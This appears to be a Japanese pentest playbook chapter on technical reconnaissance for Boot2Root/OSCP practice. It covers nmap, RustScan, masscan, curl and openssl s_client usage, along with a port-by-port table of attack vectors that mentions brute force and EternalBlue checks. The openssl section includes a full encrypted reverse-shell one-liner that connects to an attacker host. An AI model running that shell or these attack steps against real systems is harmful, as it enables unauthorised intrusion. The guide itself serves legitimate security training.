# Reconnaissance（技術的偵察）

Reconnaissance は、攻撃対象に対して **技術的にアクセス可能な情報を収集するフェーズ**です。  
OSINT（公開情報収集）とは別章であり、ここでは「実際にターゲットへアクセスして得られる情報」を扱います。

Boot2Root テンプレートの **Recon 章の詳細版**として機能します。

---

# 🎯 目的

- 外部から見えるサービスを把握する  
- 攻撃可能なサービスを特定する  
- 次の Enumeration / Initial Access の方向性を決める  
- 内部ネットワークの存在を推測する  
- OSCP レポートで必要な「攻撃の根拠」を整理する  

---

## 📘 目次

1. Port Scanning  
   - Nmap  
   - RustScan  
   - Masscan  
2. Banner Grab / Version Detection  
3. HTTP / SSL Recon
   - curl
   - openssl
5. SMB / FTP / SSH Recon  
6. Attack Surface Identification  
7. Boot2Root との連携

---

## 1. Port Scanning

ポートスキャンは Recon の中心であり、  
**攻撃の入口を決める最重要フェーズ**です。

---

### 1.1 Nmap（最重要）

#### 主なスキャン
```
nmap -p- -T4 -v <TARGET>
nmap -sC -sV -O -T4 <TARGET>
nmap --script vuln <TARGET>
```

#### 確認ポイント
- 開いているポート  
- サービスの種類  
- バージョン（古いほど exploit が多い）  
- Web / SMB / FTP / SSH の有無  
- 内部 Web（8080/8000/5000）  
- DB（3306 / 5432）  
- Redis（6379）  

#### 頻出ポート
| Port / Service | Attack Vector（攻撃の糸口） | Next Action（次のアクション） |
| :--- | :--- | :--- |
| **21 / FTP** | Anonymousログイン、書き込み権限、ソース露出, | `anonymous`ログインの試行,,, ファイル一覧の確認とダウンロード,, バナーからのバージョン特定 |
| **22 / SSH** | バナーからのOS/バージョン特定、認証情報, | バナーによるOS/OpenSSHバージョンの特定,, `Hydra`による辞書攻撃・ブルートフォース,, Metasploitの`ssh_login`モジュール |
| **23 / Telnet** | 平文の認証情報、バナーによるOS特定 | `nc` または `telnet` でのバナー取得、既知の脆弱性（FreeBSD等）の確認 |
| **25 / SMTP** | ユーザー名の露出、オープンリレー | `VRFY` コマンドによる有効ユーザー名の列挙、`EXPN` コマンドの試行 |
| **53 / DNS** | ゾーン情報の漏洩、DNSスプーフィング | `nslookup` / `dig` による名前解決、ゾーン転送（AXFR）の試行 |
| **80 / HTTP** | Webサーバー、CMS、公開ディレクトリ,,, | `curl -I`（バナー取得）, `whatweb`（技術特定）, `Nikto`（脆弱性スキャン）,, `Gobuster`/`Wfuzz`（ディレクトリ列挙）,, ソースコード解析, |
| **443 / HTTPS** | SSL/TLS情報の露出、WAFの存在, | SSL証明書の詳細確認, NSEスクリプト（`ssl-heartbleed`など）による脆弱性診断, `Nikto` |
| **139 / 445 / SMB** | 共有フォルダ、Nullセッション、脆弱なプロトコル,, | `smbclient -N -L`（共有列挙）, `enum4linux`（詳細列挙）, 既知の脆弱性（MS08-067, EternalBlueなど）の確認, |
| **3306 / MySQL** | 外部アクセスの許可、未認証アクセス、認証情報, | `mysql -u root`（パスワードなしログイン）の試行,, Webサーバー上の`config.php`等からの認証情報の探索, |
| **6379 / Redis** | ※情報源に記述なし | （情報源にはRedisに関する直接的な記述はありません） |
| **8080 / 8000 / 5000** | 管理画面、API、Webプロキシ、開発用サーバー,, | ブラウザでのアクセス確認,, APIヘッダー（JSON等）の確認, `Gobuster`等による隠しパスの探索, |
| **111 / SunRPC (rpcbind)** | 登録済みサービス情報の露出 | `rpcinfo -p` によるプログラム番号、バージョン、動的ポートの列挙 |
| **161 / SNMP** | デフォルトのコミュニティ名、システム構成情報の露出 | `snmpwalk` でのプロセス、ソフトウェア、ネットワーク情報の列挙 |
| **1433 / MS SQL** | 脆弱な `sa` アカウント、未認可アクセス | `mssql_ping` によるインスタンス特定、`mssql_login` によるブルートフォース |
| **3389 / RDP** | 既知の脆弱性（MS12-020等）、認証情報の不足 | Metasploitでの脆弱性チェック、`Hydra` / `Ncrack` による認証突破 |
| **5900 / VNC** | 未認証アクセス、脆弱な認証 | `vnc_none_auth` スキャナーによるパスワードなしアクセスの確認 |
| **6667 / IRC** | バックドアが仕込まれたサービス（UnrealIRCd等） | `nc` によるバナー取得、既知のバックドアコマンドの検証 |
| **5985 / WinRM** | HTTP経由のリモート管理アクセス | `Invoke-Command` によるコマンド実行の試行、認証設定の確認 |
| **2049 / NFS** | 公開共有ディレクトリ、不適切なアクセス制御 | `rpcinfo` によるNFS確認、マウント可能なディレクトリ（Shares）の列挙 |
| **その他の古いサービス** | バナーに現れる旧バージョンの脆弱性,, | `searchsploit`によるExploit探索,,, CVE番号に基づく公開PoCの調査,, バナーグラビングによる詳細特定 |

---

### 1.2 RustScan（高速）

```
rustscan -a <TARGET> --ulimit 5000 -- -sC -sV
```

#### 使いどころ
- ポートだけ高速で知りたいとき  
- Nmap の前処理として最適  

---

### 1.3 Masscan（超高速）

```
masscan -p1-65535 <TARGET> --rate=10000
```

#### 使いどころ
- 大規模ポートスキャン  
- FW / ACL の存在確認  

---

## 2. Banner Grab / Version Detection

```
nc -nv <TARGET> <PORT>
openssl s_client -connect <TARGET>:443
```

### 目的
- サービスの種類  
- バージョン  
- ミドルウェア  
- 内部ホスト名（SSL CN/SAN）  

---

## 3. HTTP / SSL Recon

### HTTP
```
curl -I http://<TARGET>
whatweb <TARGET>
ffuf -u http://<TARGET>/FUZZ -w common.txt
```
### 3.1 curl

偵察（Reconnaissance）段階において、**curl**はHTTP/HTTPSリクエストを発行し、ターゲットの技術スタックや隠れたリソースを特定するための非常に柔軟で強力なコマンドラインツールです。

#### Recon段階で頻用される主要なオプション

| オプション | 説明 | 主な用途 |
| :--- | :--- | :--- |
| **`-I`** (`--head`) | ヘッダーのみ取得 | バナーグラビング、サーバー情報の特定。 |
| **`-L`** (`--location`) | リダイレクトを追跡 | 301/302リダイレクト先の最終的なURLを確認。 |
| **`-s`** (`--silent`) | サイレントモード | 進捗やエラーを非表示にし、スクリプトでの利用に最適。 |
| **`-v`** (`--verbose`) | 詳細表示 | リクエスト/レスポンスヘッダーやTLSハンドシェイクの確認。 |
| **`-X`** | HTTPメソッドの指定 | `POST`, `PUT`, `OPTIONS`, `TRACE` などの動作確認。 |
| **`-H`** (`--header`) | カスタムヘッダーの追加 | 特定のトークン送信や、WAF回避のテスト。 |
| **`-A`** (`--user-agent`) | User-Agentの指定 | ブラウザの偽装、レート制限の回避テスト。 |
| **`-b`** (`--cookie`) | クッキーの送信 | 認証後のセッション維持が必要な調査。 |
| **`-d`** (`--data`) | データの送信 | `POST`リクエストでのパラメータ送信。 |
| **`-w`** (`--write-out`) | 出力形式の指定 | ステータスコード（`%{http_code}`）のみの抽出など。 |
| **`-o`** (`--output`) | ファイルに保存 | 取得したデータの保存や、`/dev/null`への破棄。 |

---

#### 具体的な活用シーンとコマンド例

##### ヘッダー情報の取得（リダイレクト追跡あり）
`Server`ヘッダー（例: `Apache/2.4.10 (Debian)`）や `X-Powered-By`（例: `PHP/5.2.4`）から情報を収集します。

```
curl -LI http://<target_ip>
```

#### robots.txtの取得

```
curl http://<target_domain>/robots.txt
```

#### 許可されているメソッドの確認
サーバーが許可しているメソッド（`OPTIONS`, `PUT`, `DELETE`, `TRACE`など）を調査し、攻撃の糸口を探ります。

```
curl -X OPTIONS -v http://<target_ip>
```

#### TRACEメソッドによるデバッグ情報の確認

```
curl -X TRACE http://<target_ip>
```

#### ステータスコードのみ表示
多数のURLに対して、有効なページが存在するかどうかを高速に確認する場合、ステータスコードのみを出力させます。

```
curl -s -o /dev/null -w "%{http_code}\n" http://<target_ip>
```
   
### 3.2 openssl

`openssl s_client` は、SSL/TLSで暗号化されたサービス（HTTPS、SMTPS、IMAPSなど）へ直接接続し、**証明書・TLS設定・暗号スイート・バナー情報**などを調査するためのコマンドです。

> **主な用途**
> - SSL/TLS証明書の取得
> - TLSバージョンの確認
> - 暗号スイートの調査
> - HTTPSなど暗号化サービスのバナー取得
> - TLS通信の手動検証

---

#### 主なオプション

| オプション | 説明 | 使用頻度 |
|------------|------|:-------:|
| `-connect <host>:<port>` | 接続先ホスト・ポートを指定 | ⭐⭐⭐⭐⭐ |
| `-quiet` | 余計なTLS情報を表示せず対話通信に集中 | ⭐⭐⭐⭐☆ |
| `-showcerts` | サーバー証明書チェーンを表示 | ⭐⭐⭐⭐⭐ |
| `-tls1` | TLS 1.0で接続を試行 | ⭐⭐⭐☆☆ |
| `-tls1_1` | TLS 1.1で接続を試行 | ⭐⭐⭐☆☆ |
| `-tls1_2` | TLS 1.2で接続を試行 | ⭐⭐⭐⭐⭐ |
| `-tls1_3` | TLS 1.3で接続を試行 | ⭐⭐⭐⭐⭐ |
| `-ssl3` | SSLv3で接続を試行（古いOpenSSLのみ） | ⭐⭐☆☆☆ |
| `-ssl2` | SSLv2で接続を試行（現在はほぼ廃止） | ⭐☆☆☆☆ |

> **💡 Tips**
>
> 現在のOpenSSLでは `-ssl2` や `-ssl3` はサポートされていないことが多く、実務では `-tls1_2` と `-tls1_3` を使用するケースが中心です。

---

#### 活用例

##### SSL/TLS証明書の取得

ターゲットの証明書を表示します。

```bash
openssl s_client -connect example.com:443
```

取得できる情報

- Subject
- Issuer
- 有効期限
- 公開鍵
- TLSバージョン
- Cipher Suite

---

##### 証明書チェーンの取得

サーバーから送信された証明書チェーン全体を表示します。

```bash
openssl s_client -connect example.com:443 -showcerts
```

調査できる項目

- Root CA
- Intermediate CA
- Server Certificate

---

##### 証明書のみを保存

後から `openssl x509` で解析したい場合。

```bash
openssl s_client -connect example.com:443 </dev/null 2>/dev/null \
| sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' \
> cert.pem
```

保存後

```bash
openssl x509 -in cert.pem -text -noout
```

取得できる情報

- Subject
- Issuer
- SAN
- 有効期限
- Fingerprint

---

##### SAN（Subject Alternative Name）の確認

複数のドメイン名が登録されている場合があります。

```bash
openssl x509 -in cert.pem -text -noout
```

確認ポイント

- SAN
- ワイルドカード証明書
- サブドメイン

例

```text
DNS:www.example.com
DNS:mail.example.com
DNS:vpn.example.com
```

SANから新しい攻撃対象を発見できることがあります。

---

##### TLSバージョンの確認

TLS 1.2

```bash
openssl s_client -connect example.com:443 -tls1_2
```

TLS 1.3

```bash
openssl s_client -connect example.com:443 -tls1_3
```

古いTLSが有効か調べる場合

```bash
openssl s_client -connect example.com:443 -tls1
```

調査目的

- TLS1.0
- TLS1.1
- TLS1.2
- TLS1.3

対応状況を確認できます。

---

##### 古いSSL/TLSの確認

古いOpenSSLのみ

```bash
openssl s_client -connect example.com:443 -ssl3
```

または

```bash
openssl s_client -connect example.com:443 -ssl2
```

接続できる場合

- SSLv2
- SSLv3

など危険なプロトコルが有効になっている可能性があります。

---

##### HTTPSのバナー取得

TLS通信のままHTTPリクエストを送信できます。

```bash
openssl s_client -quiet -connect example.com:443
```

接続後

```http
HEAD / HTTP/1.0

```

取得例

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: ...
```

取得できる情報

- Server
- Location
- Powered-By
- Cookie

---

##### SMTPS・IMAPSなどの調査

HTTPS以外でもTLS通信なら調査できます。

SMTP

```bash
openssl s_client -connect mail.example.com:465
```

IMAPS

```bash
openssl s_client -connect mail.example.com:993
```

POP3S

```bash
openssl s_client -connect mail.example.com:995
```

LDAPS

```bash
openssl s_client -connect ldap.example.com:636
```

---

##### 暗号化されたシェル通信（参考）

> ⚠️ **CTFや認可された検証環境のみで使用してください。**

SSL/TLSで通信を暗号化したシェル接続の例です。

```bash
mkfifo /tmp/s; \
/bin/sh -i < /tmp/s 2>&1 | \
openssl s_client -quiet -connect <attacker_ip>:<port> \
> /tmp/s; \
rm /tmp/s
```

---

#### Reconnaissanceでよく使うコマンド

| 目的 | コマンド |
|------|----------|
| 証明書確認 | `openssl s_client -connect target:443` |
| 証明書チェーン | `openssl s_client -connect target:443 -showcerts` |
| TLS1.2確認 | `openssl s_client -connect target:443 -tls1_2` |
| TLS1.3確認 | `openssl s_client -connect target:443 -tls1_3` |
| バナー取得 | `openssl s_client -quiet -connect target:443` |
| 証明書保存 | `openssl s_client ... > cert.pem` |

---

#### Nmapとの使い分け

| 項目 | Nmap | OpenSSL s_client |
|------|:---:|:----------------:|
| ポートスキャン | ✅ | ❌ |
| サービス検出 | ✅ | ❌ |
| TLS証明書取得 | ◯ | ✅ |
| TLSバージョン確認 | ◯ | ✅ |
| 暗号スイート確認 | ◯（NSE） | ◯ |
| HTTPバナー取得 | △ | ✅ |
| 手動でTLS通信を確認 | ❌ | ✅ |

> **おすすめの使い分け**
>
> - **Nmap**：SSL/TLSサービスの発見や網羅的な列挙（`ssl-enum-ciphers`、`ssl-cert`、`ssl-heartbleed` などのNSEスクリプト）
> - **openssl s_client**：特定サービスのTLS設定を手動で確認したり、証明書やバナーを詳細に調査したい場合

#### 確認ポイント
- Server: Apache / nginx / IIS  
- X-Powered-By: PHP / ASP.NET  
- admin パネルの存在  
- 内部ホスト名（CN/SAN）  

---

## 4. SMB / FTP / SSH Recon

### SMB
```
smbclient -N -L //<TARGET>/
```

#### 確認ポイント
- anonymous  
- 認証情報  
- バックアップファイル  

---

## FTP
```
ftp <TARGET>
```

### 確認ポイント
- anonymous  
- 書き込み可能か  
- Web ソースコードの有無  

---

## SSH
```
ssh -v user@<TARGET>
```

### 確認ポイント
- バナー情報  
- OS / バージョン  
- ユーザー名の推測  

---

# 5. Attack Surface Identification

Recon の結果から、攻撃可能な面を特定する。

### 主な攻撃面
- Web（最も突破口が多い）  
- SMB（認証情報）  
- FTP（WebShell）  
- DB（弱パスワード）  
- Redis（未認証）  
- 内部 Web（Pivot 必須）  

---

# 6. Boot2Root との連携

Boot2Root の **Recon 章**は軽量化されており、  
詳細はこのページにリンクされます。

Boot2Root の流れ：

```
Recon
↓
Enumeration
↓
Initial Access
```

そのため、Boot2Root では結果だけ記録し、  
技術的な深掘りは Pentest-Playbook の Reconnaissance に集約します。

---

# 🎯 この章の目的

- Recon の技術体系を 1ページに集約  
- Boot2Root の軽量テンプレートと連携  
- OSCP レポート品質の情報整理  
- 将来の構造変更にも強い設計  
